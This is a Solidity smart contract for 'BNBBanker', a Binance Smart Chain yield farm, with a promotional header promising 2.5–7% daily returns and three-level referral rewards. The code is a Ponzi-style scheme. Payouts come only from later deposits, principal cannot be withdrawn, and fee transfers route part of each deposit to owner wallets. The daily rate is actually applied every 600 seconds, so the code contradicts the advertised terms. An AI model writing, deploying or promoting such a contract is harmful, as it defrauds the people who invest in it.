/**
 *Submitted for verification at BscScan.com on 2021-11-03
*/

/*   BNBBanker - Community Experimental yield farm on Binance Smart Chain.
 *   The only official platform of original BNBBanker
 *   All other platforms with the same contract code are FAKE
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnbbanker.com                                      │
 *   │                                                                       │
 *   │   Telegram Public Chat: @bnbbanker                                    │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                         │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet
 *   2) Choose one of the tariff plans, enter the BNB amount (0.05 BNB minimum) using our website "Stake" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Minimal deposit: 0.05 BNB, no maximal limit
 *   - Total income: based on your tarrif plan (from 2.5% to 7% daily) 
 *   - Earnings every moment, withdraw any time
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 3-level referral reward: 7% - 3% - 2%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 88% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 12% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   Note: The principal deposit cannot be withdrawn, the only return users can get are daily dividends and
 *         referral rewards. Payments is possible only if contract balance have enough BNB. Please analyze the transaction
 * 		   history and balance of the smart contract before investing.
 */

pragma solidity 0.5.10;

contract BNBBanker {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether; // 0.05 bnb
	uint256[] public REFERRAL_PERCENTS = [70, 30, 20];
	uint256 constant public TOTAL_REF = 120;
	uint256 constant public CEO_1_FEE = 80;
	uint256 constant public CEO_2_FEE = 10;
	uint256 constant public DEV_FEE = 10;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	// uint256 constant public TIME_STEP = 1 days;
	uint256 constant public TIME_STEP = 600;

	uint256 public totalInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;

	uint256 public startDate;

	address payable public ceo1Wallet;
	address payable public ceo2Wallet;
	address payable public devWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceo1Addr, address payable ceo2Addr, address payable devAddr, uint256 start) public {
		require(!isContract(ceo1Addr) && !isContract(ceo2Addr) && !isContract(devAddr));
		ceo1Wallet = ceo1Addr;
		ceo2Wallet = ceo2Addr;
		devWallet = devAddr;

		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}

        plans.push(Plan(100, 25));
        plans.push(Plan(60,  35));
        plans.push(Plan(45,  30));
        plans.push(Plan(20,  70));
	}

	function invest(address referrer, uint8 plan) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 4, "Invalid plan");

		uint256 ceo1 = msg.value.mul(CEO_1_FEE).div(PERCENTS_DIVIDER);
		uint256 ceo2 = msg.value.mul(CEO_2_FEE).div(PERCENTS_DIVIDER);
		uint256 dFee = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);
		ceo1Wallet.transfer(ceo1);
		ceo2Wallet.transfer(ceo2);
		devWallet.transfer(dFee);
		emit FeePayed(msg.sender, ceo1.add(ceo2).add(dFee));

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}else{
			uint256 amount = msg.value.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
			ceo1Wallet.transfer(amount);
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(plan, msg.value, block.timestamp));

		totalInvested = totalInvested.add(msg.value);

		emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		msg.sender.transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
				}
			}
		}

		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[3] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}